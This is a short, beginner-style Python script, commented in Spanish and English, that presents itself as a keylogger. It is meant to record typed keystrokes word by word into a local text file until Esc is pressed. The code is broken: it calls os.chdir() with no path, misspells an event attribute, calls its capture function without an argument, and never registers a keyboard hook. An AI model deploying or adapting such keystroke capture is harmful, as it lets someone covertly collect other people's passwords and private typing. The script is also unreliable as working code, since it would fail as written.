###we import the libraries that we will use

import os
import keyboard
import sys

###we create the variable 'palabra'(word in spanish)

palabra = ''

###locate in the path to generate the directory  

ruta = os.chdir()###locate desired route

###create directory to locate the .txt file

os.makedirs('keylogger_prueba',exist_ok= True)

###move to the newly created directory to create the .txt file in which we will write later on 

os.chdir('keylogger_prueba')
try:
    with open ('keylogger.txt','x') as file :
        pass
except FileExistsError:
    pass

###we define the function that will store the words for the variable 'palabra'

def pulsacion_palabra(pulsacion):

    global palabra

    if keyboard.read_event():
        if pulsacion.event_pype == keyboard.KEY_DOWN:
            if pulsacion.name == 'space':
                guardar_palabra()
            elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
                palabra += pulsacion.name

###we define the function to store the words in the file 

def guardar_palabra():
    with open('keylogger.txt','a') as file:
        file.write(palabra +'\n')
    resetear_palabra()

###we define the function to reset the 'palabra' variable and write it again 
 
def resetear_palabra():
    global palabra
    palabra = ''

###we define the main function of the program 

def main():
    pulsacion_palabra()
    guardar_palabra()
    resetear_palabra()
    
#we use the main funcion to run the program and determinate the key 'esc' to stop the program

main()
try:
    keyboard.wait('esc')
except KeyboardInterrupt:
    pass
